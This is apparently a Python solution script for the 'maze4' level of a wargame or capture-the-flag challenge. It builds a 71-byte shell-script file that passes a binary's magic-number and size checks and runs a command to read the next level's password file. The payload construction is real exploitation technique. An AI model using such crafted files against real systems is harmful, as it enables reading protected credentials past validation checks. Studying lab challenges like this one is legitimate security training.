#!/usr/bin/env python3
"""Build the maze4 'valid file' payload.

Gate (gdb-verified on the lab, ebp-relative, bufA = ebp-0x38, bufB = ebp-0xb0):
    factors = bufA[7], bufA[8]     = file bytes 7 and 8
    lseek offset = dword at bufA+28 = file bytes 28..31
    compared dword = dword at bufB+12 = file bytes [off+12 .. off+15]
    size check: st_size (stat buf at ebp-0x90, st_size at +44) <= 123

With "#!/bin/sh" the factors are 's'*'h' = 115*104 = 11960 = 0x2EB8.
Choose lseek offset 4: the magic dword lands at file bytes 16..19 and the
offset dword at 28..31 -- both INSIDE the line-2 shell comment, so dash never
parses them. Line 3 (clean, from byte 46) does the actual work.
"""
import sys

data = bytearray(b"#!/bin/sh\n #")              # 0..11  line2 = comment
data += b"\x00" * 4                             # 12..15 free
data += bytes([0xB8, 0x2E, 0x00, 0x00])         # 16..19 magic: read2[12..15] = 11960
data += b"\x00" * 8                             # 20..27 free
data += bytes([0x04, 0x00, 0x00, 0x00])         # 28..31 lseek offset = 4
data += b"\x00" * 13                            # 32..44 free
data += b"\n"                                   # 45     comment ends
data += b"cat /etc/maze_pass/maze5\n"           # 46..70 line3 = the real command
assert len(data) == 71, len(data)
open(sys.argv[1], "wb").write(bytes(data))
print("wrote", len(data), "bytes")
